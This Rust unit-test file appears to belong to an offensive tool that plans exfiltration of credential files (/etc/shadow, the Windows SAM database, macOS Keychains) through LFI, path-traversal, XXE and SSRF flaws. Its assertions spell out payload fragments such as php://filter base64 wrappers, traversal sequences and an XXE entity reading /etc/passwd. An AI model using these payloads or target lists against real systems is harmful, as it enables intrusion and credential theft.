use crate::file_exfil_planner::*;

#[test]
fn test_linux_priority_files_ordering() {
    let files = get_priority_files(TargetOs::Linux);
    assert!(!files.is_empty());

    let first_non_critical = files
        .iter()
        .position(|f| f.priority != FilePriority::Critical);
    let last_critical = files
        .iter()
        .rposition(|f| f.priority == FilePriority::Critical);

    if let (Some(first_nc), Some(last_c)) = (first_non_critical, last_critical) {
        assert!(
            last_c < first_nc,
            "all critical files must come before non-critical"
        );
    }

    let shadow = files.iter().find(|f| f.path == "/etc/shadow");
    assert!(shadow.is_some(), "/etc/shadow must be in linux targets");
    assert_eq!(shadow.unwrap().priority, FilePriority::Critical);

    let passwd = files.iter().find(|f| f.path == "/etc/passwd");
    assert!(passwd.is_some());
    assert_eq!(passwd.unwrap().category, FileCategory::Credentials);
}

#[test]
fn test_windows_priority_files_has_sam() {
    let files = get_priority_files(TargetOs::Windows);

    let sam = files
        .iter()
        .find(|f| f.path.contains("SAM") && f.priority == FilePriority::Critical);
    assert!(sam.is_some(), "Windows targets must include SAM database");
    assert!(sam.unwrap().is_binary);

    let web_config = files.iter().find(|f| f.path == "web.config");
    assert!(web_config.is_some());
    assert_eq!(web_config.unwrap().priority, FilePriority::Critical);
}

#[test]
fn test_macos_priority_files() {
    let files = get_priority_files(TargetOs::MacOs);
    assert!(!files.is_empty());

    let master_passwd = files.iter().find(|f| f.path == "/etc/master.passwd");
    assert!(
        master_passwd.is_some(),
        "macOS must include /etc/master.passwd"
    );
    assert_eq!(master_passwd.unwrap().priority, FilePriority::Critical);

    let kcpassword = files.iter().find(|f| f.path == "/private/etc/kcpassword");
    assert!(kcpassword.is_some());
    assert!(kcpassword.unwrap().is_binary);

    let keychain = files.iter().find(|f| f.path.contains("Keychains"));
    assert!(keychain.is_some());
}

#[test]
fn test_plan_file_exfiltration_linux() {
    let config = FileExfilConfig::new(TargetOs::Linux, FileReadVuln::Lfi);
    let plan = plan_file_exfiltration(&config).unwrap();

    assert_eq!(plan.target_os, TargetOs::Linux);
    assert!(plan.total_files > 0);
    assert!(plan.total_requests >= plan.total_files);
    assert!(!plan.priority_summary.is_empty());
    assert!(!plan.parallel_groups.is_empty());

    let (first_prio, _) = plan.priority_summary[0];
    assert_eq!(first_prio, FilePriority::Critical);
}

#[test]
fn test_plan_includes_custom_targets() {
    let config = FileExfilConfig::new(TargetOs::Linux, FileReadVuln::ArbitraryRead)
        .with_custom_target("/opt/secrets/api_key.txt")
        .with_custom_target("/tmp/dump.sql");

    let plan = plan_file_exfiltration(&config).unwrap();

    let custom_found = plan
        .file_plans
        .iter()
        .any(|p| p.target.path == "/opt/secrets/api_key.txt");
    assert!(custom_found, "plan must include custom target files");

    let dump_found = plan
        .file_plans
        .iter()
        .any(|p| p.target.path == "/tmp/dump.sql");
    assert!(dump_found);
}

#[test]
fn test_read_payload_lfi() {
    let payload = generate_read_payload("/etc/passwd", FileReadVuln::Lfi, None);
    assert!(payload.contains("php://filter"));
    assert!(payload.contains("base64-encode"));
    assert!(payload.contains("/etc/passwd"));

    let with_prefix = generate_read_payload("/etc/shadow", FileReadVuln::Lfi, Some("../../../../"));
    assert!(with_prefix.contains("../../../..//etc/shadow"));
}

#[test]
fn test_read_payload_path_traversal() {
    let payload = generate_read_payload("/etc/passwd", FileReadVuln::PathTraversal, None);
    assert!(payload.contains("..%2f"));
    assert!(payload.contains("/etc/passwd"));

    let with_prefix = generate_read_payload(
        "/etc/shadow",
        FileReadVuln::PathTraversal,
        Some("....//....//"),
    );
    assert!(with_prefix.starts_with("....//....///etc/shadow"));
}

#[test]
fn test_read_payload_xxe() {
    let payload = generate_read_payload("/etc/passwd", FileReadVuln::Xxe, None);
    assert!(payload.contains("<!DOCTYPE"));
    assert!(payload.contains("<!ENTITY xxe SYSTEM"));
    assert!(payload.contains("file:///etc/passwd"));
    assert!(payload.contains("&xxe;"));
}

#[test]
fn test_read_payload_ssrf() {
    let payload = generate_read_payload("/etc/passwd", FileReadVuln::Ssrf, None);
    assert_eq!(payload, "file:///etc/passwd");
}

#[test]
fn test_chunked_read_for_large_files() {
    let chunks = chunk_file_read("/var/log/auth.log", 50_000, 8192, FileReadVuln::Lfi);
    assert!(chunks.len() > 1);

    let expected_chunks = (50_000 + 8191) / 8192;
    assert_eq!(chunks.len(), expected_chunks);

    assert_eq!(chunks[0].chunk_index, 0);
    assert_eq!(chunks[0].offset, 0);
    assert_eq!(chunks[0].length, 8192);

    let last = chunks.last().unwrap();
    assert_eq!(last.chunk_index, (expected_chunks - 1) as u32);
    assert_eq!(last.total_chunks, expected_chunks as u32);
    assert_eq!(last.offset, (expected_chunks - 1) * 8192);
    assert!(last.length <= 8192);
    assert!(last.read_command.contains("dd if="));
}

#[test]
fn test_single_chunk_for_small_files() {
    let chunks = chunk_file_read("/etc/hostname", 64, 8192, FileReadVuln::Lfi);
    assert_eq!(chunks.len(), 1);
    assert_eq!(chunks[0].chunk_index, 0);
    assert_eq!(chunks[0].total_chunks, 1);
    assert_eq!(chunks[0].offset, 0);
    assert_eq!(chunks[0].length, 64);
}

#[test]
fn test_single_chunk_for_unknown_size() {
    let chunks = chunk_file_read("/etc/passwd", 0, 8192, FileReadVuln::Lfi);
    assert_eq!(chunks.len(), 1);
    assert_eq!(chunks[0].total_chunks, 1);
    assert_eq!(chunks[0].length, 0);
}

#[test]
fn test_parallel_grouping() {
    let config = FileExfilConfig::new(TargetOs::Linux, FileReadVuln::Lfi).with_parallel_reads(true);

    let plan = plan_file_exfiltration(&config).unwrap();
    let groups = &plan.parallel_groups;

    assert!(!groups.is_empty());

    let all_indices: Vec<usize> = groups.iter().flat_map(|g| g.iter().copied()).collect();
    for i in 0..plan.file_plans.len() {
        assert!(
            all_indices.contains(&i),
            "every plan index must appear in a parallel group"
        );
    }

    if groups.len() >= 2 {
        let first_group_priorities: Vec<FilePriority> = groups[0]
            .iter()
            .map(|&i| plan.file_plans[i].target.priority)
            .collect();
        let second_group_priorities: Vec<FilePriority> = groups[1]
            .iter()
            .map(|&i| plan.file_plans[i].target.priority)
            .collect();

        assert!(
            first_group_priorities[0] <= second_group_priorities[0],
            "first group should be same or higher priority than second"
        );
    }
}

#[test]
fn test_display_impls() {
    assert_eq!(format!("{}", TargetOs::Linux), "linux");
    assert_eq!(format!("{}", TargetOs::Windows), "windows");
    assert_eq!(format!("{}", TargetOs::MacOs), "macos");

    assert_eq!(format!("{}", FilePriority::Critical), "critical");
    assert_eq!(format!("{}", FilePriority::Low), "low");

    assert_eq!(format!("{}", FileCategory::SshKeys), "ssh-keys");
    assert_eq!(format!("{}", FileCategory::CloudMetadata), "cloud-metadata");

    assert_eq!(format!("{}", FileEncoding::Base64), "base64");
    assert_eq!(format!("{}", FileEncoding::UrlEncoded), "url-encoded");

    assert_eq!(format!("{}", FileReadVuln::Lfi), "lfi");
    assert_eq!(format!("{}", FileReadVuln::Xxe), "xxe");
    assert_eq!(format!("{}", FileReadVuln::PathTraversal), "path-traversal");

    let err = FileExfilError::InvalidConfig("bad".to_string());
    assert!(format!("{err}").contains("bad"));

    let err2 = FileExfilError::NoTargetFiles;
    assert!(format!("{err2}").contains("no target"));
}

#[test]
fn test_invalid_config() {
    let config = FileExfilConfig {
        target_os: TargetOs::Linux,
        vuln_type: FileReadVuln::Lfi,
        max_read_size: 0,
        base_path: None,
        custom_targets: Vec::new(),
        encoding: FileEncoding::PlainText,
        parallel_reads: false,
    };

    let result = plan_file_exfiltration(&config);
    assert!(result.is_err());
    match result.unwrap_err() {
        FileExfilError::InvalidConfig(msg) => {
            assert!(msg.contains("max_read_size"));
        }
        other => panic!("expected InvalidConfig, got {other:?}"),
    }
}

#[test]
fn test_file_priority_ordering() {
    assert!(FilePriority::Critical < FilePriority::High);
    assert!(FilePriority::High < FilePriority::Medium);
    assert!(FilePriority::Medium < FilePriority::Low);
}

#[test]
fn test_binary_file_gets_base64_encoding() {
    let target = FileTarget {
        path: "/proc/self/environ".to_string(),
        priority: FilePriority::High,
        category: FileCategory::EnvironmentVariables,
        description: "process env".to_string(),
        os: TargetOs::Linux,
        estimated_size_bytes: Some(4_096),
        is_binary: true,
    };

    let config = FileExfilConfig::new(TargetOs::Linux, FileReadVuln::Lfi);
    let plan = plan_single_file(&target, &config);
    assert_eq!(plan.encoding, FileEncoding::Base64);
}

#[test]
fn test_text_file_keeps_plain_encoding() {
    let target = FileTarget {
        path: "/etc/passwd".to_string(),
        priority: FilePriority::Critical,
        category: FileCategory::Credentials,
        description: "passwd".to_string(),
        os: TargetOs::Linux,
        estimated_size_bytes: Some(2_500),
        is_binary: false,
    };

    let config = FileExfilConfig::new(TargetOs::Linux, FileReadVuln::Lfi);
    let plan = plan_single_file(&target, &config);
    assert_eq!(plan.encoding, FileEncoding::PlainText);
}

#[test]
fn test_config_builder_chain() {
    let config = FileExfilConfig::new(TargetOs::Windows, FileReadVuln::PathTraversal)
        .with_max_read_size(4096)
        .with_base_path("..\\..\\..\\")
        .with_custom_target("C:\\secrets.txt")
        .with_encoding(FileEncoding::HexDump)
        .with_parallel_reads(false);

    assert_eq!(config.max_read_size, 4096);
    assert_eq!(config.base_path.as_deref(), Some("..\\..\\..\\"));
    assert_eq!(config.custom_targets.len(), 1);
    assert_eq!(config.encoding, FileEncoding::HexDump);
    assert!(!config.parallel_reads);
}

#[test]
fn test_arbitrary_read_payload_is_raw_path() {
    let payload =
        generate_read_payload("/etc/passwd", FileReadVuln::ArbitraryRead, Some("ignored"));
    assert_eq!(payload, "/etc/passwd");
}

#[test]
fn test_error_display_variants() {
    let e1 = FileExfilError::UnsupportedOs("plan9".to_string());
    assert!(format!("{e1}").contains("plan9"));

    let e2 = FileExfilError::NoTargetFiles;
    let desc = format!("{e2}");
    assert!(!desc.is_empty());
}
